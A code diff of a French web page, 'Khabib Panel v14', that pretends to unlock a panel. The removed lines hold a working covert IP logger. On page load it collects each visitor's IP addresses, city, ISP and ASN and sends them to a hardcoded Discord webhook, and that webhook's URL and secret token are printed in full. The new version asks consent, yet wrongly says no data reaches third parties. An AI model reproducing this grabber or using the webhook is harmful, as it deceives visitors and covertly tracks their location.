@@ -2,7 +2,7 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>khabib panel v14</title>
+    <title>Khabib Panel v14</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -14,92 +14,118 @@
             height: 100vh;
             margin: 0;
         }
-
         .box {
             background: #020617;
-            padding: 25px;
+            padding: 30px;
             border-radius: 10px;
-            max-width: 420px;
+            max-width: 450px;
             text-align: center;
             box-shadow: 0 0 20px rgba(0,0,0,0.6);
+        }
+        button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            border: none;
+            border-radius: 5px;
+        }
+        .accept { background: #22c55e; color: white; }
+        .decline { background: #ef4444; color: white; margin-left: 10px; }
+        pre {
+            text-align: left;
+            background: #1e293b;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            white-space: pre-wrap;
         }
     </style>
 </head>
 <body>
-
-<div class="box" id="resultBox">
-    <h2>khabib</h2>
-    <p>Traitement en cours pour débloquer khabib panel v14...</p>
-    <p id="resultText">Chargement...</p>
+<div class="box" id="mainBox">
+    <h2>Khabib Panel v14</h2>
+    <p id="mainText">
+        Pour débloquer le panel, nous avons besoin de vérifier votre fuseau horaire.<br><br>
+        Cela nécessite de récupérer votre adresse IP publique (uniquement pour connaître approximativement votre localisation et calculer l’heure).<br><br>
+        Aucune donnée n’est stockée ni envoyée à un tiers.
+    </p>
+    <div>
+        <button class="accept" onclick="acceptPermission()">Accepter</button>
+        <button class="decline" onclick="declinePermission()">Refuser</button>
+    </div>
 </div>
 
 <script>
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1453050534851379243/QQWpYZbMCPh4wn637YIkWNvpPLw7BxVyo6kJWN2q1xxn4IXiEnL6LGU-wDVhGbMiUaEU";
+// Heure cible en Belgique (Europe/Brussels)
+const targetHourBelgium = 17; // 17:00 en Belgique
 
-window.onload = function() {
-    document.getElementById("resultText").textContent = "Récupération de vos données...";
+async function acceptPermission() {
+    const box = document.getElementById("mainBox");
+    box.innerHTML = `<h2>Khabib Panel v14</h2><p>Récupération en cours...</p>`;
 
-    let ipv4 = "Inconnu";
-    let ipv6 = "Non disponible";
-    let geoInfo = "Geo indisponible";
+    try {
+        // 1. Récupérer l'IP publique
+        const ipResponse = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipResponse.json();
+        const ipv4 = ipData.ip;
 
-    // Récup IPv4
-    fetch("https://api.ipify.org?format=json")
-        .then(res => res.json())
-        .then(data => {
-            ipv4 = data.ip;
+        // 2. Récupérer les infos geo (pays, ville, timezone, etc.)
+        const geoResponse = await fetch(`https://ipwho.is/${ipv4}`);
+        const geoData = await geoResponse.json();
 
-            // Tentative IPv6
-            return fetch("https://api64.ipify.org?format=json")
-                .then(res => {
-                    if (!res.ok) throw new Error("Pas d'IPv6");
-                    return res.json();
-                })
-                .then(data6 => { ipv6 = data6.ip; })
-                .catch(() => { ipv6 = "Non disponible"; });
-        })
-        .then(() => {
-            // Geo via ipwho.is (meilleure tolérance aux volumes)
-            return fetch(`https://ipwho.is/${ipv4}`)
-                .then(geoRes => geoRes.json())
-                .then(geoData => {
-                    if (geoData.success === false) {
-                        geoInfo = "Geo échouée : " + (geoData.message || "Inconnu");
-                        return;
-                    }
+        if (!geoData.success) {
+            throw new Error("Impossible de récupérer les infos geo");
+        }
 
-                    const flag = geoData.country_code ? String.fromCodePoint(...[...geoData.country_code.toUpperCase()].map(c => c.charCodeAt(0) + 127397 - 65)) : "";
+        // 3. Calcul de l'heure locale correspondante à 17:00 en Belgique
+        const now = new Date();
+        const belgiumToday = new Date(now.toLocaleDateString('en-CA', { timeZone: 'Europe/Brussels' }) + ` ${targetHourBelgium}:00:00`);
 
-                    geoInfo = `🌍 Pays : ${flag} ${geoData.country || "Inconnu"} (${geoData.country_code || "?"})\n` +
-                              `🏙️ Ville : ${geoData.city || "Inconnu"} (${geoData.region || "Inconnu"})\n` +
-                              `📡 ISP : ${geoData.isp || "Inconnu"}\n` +
-                              `🏢 Org / ASN : ${geoData.org || "Inconnu"} (AS${geoData.asn || "?"})`;
-                })
-                .catch(() => { geoInfo = "Geo indisponible (erreur réseau)"; });
-        })
-        .finally(() => {
-            // Envoi webhook en toutes circonstances
-            const payload = {
-                content: `📥 **Nouveau visiteur (auto)**\n` +
-                         `🌐 IPv4 : ${ipv4}\n` +
-                         `🌐 IPv6 : ${ipv6}\n` +
-                         `${geoInfo}\n` +
-                         `🕒 ${new Date().toLocaleString()}`
-            };
+        // Convertir en timestamp UTC puis en heure locale du visiteur
+        const utcTimestamp = Date.UTC(
+            belgiumToday.getUTCFullYear(),
+            belgiumToday.getUTCMonth(),
+            belgiumToday.getUTCDate(),
+            belgiumToday.getUTCHours(),
+            belgiumToday.getUTCMinutes(),
+            0
+        );
+        const localDate = new Date(utcTimestamp);
+        const localTime = localDate.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit' });
 
-            fetch(WEBHOOK_URL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            });
+        const flag = geoData.country_code 
+            ? String.fromCodePoint(...[...geoData.country_code.toUpperCase()].map(c => c.charCodeAt(0) + 127397 - 65))
+            : "";
 
-            document.getElementById("resultText").textContent = "Débloqué avec succès !";
-        })
-        .catch(() => {
-            document.getElementById("resultText").textContent = "Erreur réseau, mais données envoyées.";
-        });
+        // Affichage final
+        box.innerHTML = `
+            <h2>Débloqué avec succès !</h2>
+            <p>Quand il est <strong>17:00 en Belgique</strong>, il est <strong>${localTime}</strong> chez toi.</p>
+            <pre>
+🌍 Pays : ${flag} ${geoData.country} (${geoData.country_code})
+🏙️ Ville : ${geoData.city}, ${geoData.region}
+🕐 Ton fuseau horaire : ${geoData.timezone || "Inconnu"}
+🌐 IP : ${ipv4}
+            </pre>
+            <p>Merci d’avoir accepté ! Le panel est maintenant accessible.</p>
+        `;
+    } catch (err) {
+        box.innerHTML = `
+            <h2>Erreur</h2>
+            <p>Impossible de récupérer les informations. Réessayez plus tard ou vérifiez votre connexion.</p>
+        `;
+    }
+}
+
+function declinePermission() {
+    const box = document.getElementById("mainBox");
+    box.innerHTML = `
+        <h2>Accès refusé</h2>
+        <p>Vous avez refusé la permission. Le panel reste verrouillé.</p>
+        <p>Vous pouvez rafraîchir la page pour réessayer.</p>
+    `;
 }
 </script>
-
 </body>
 </html>
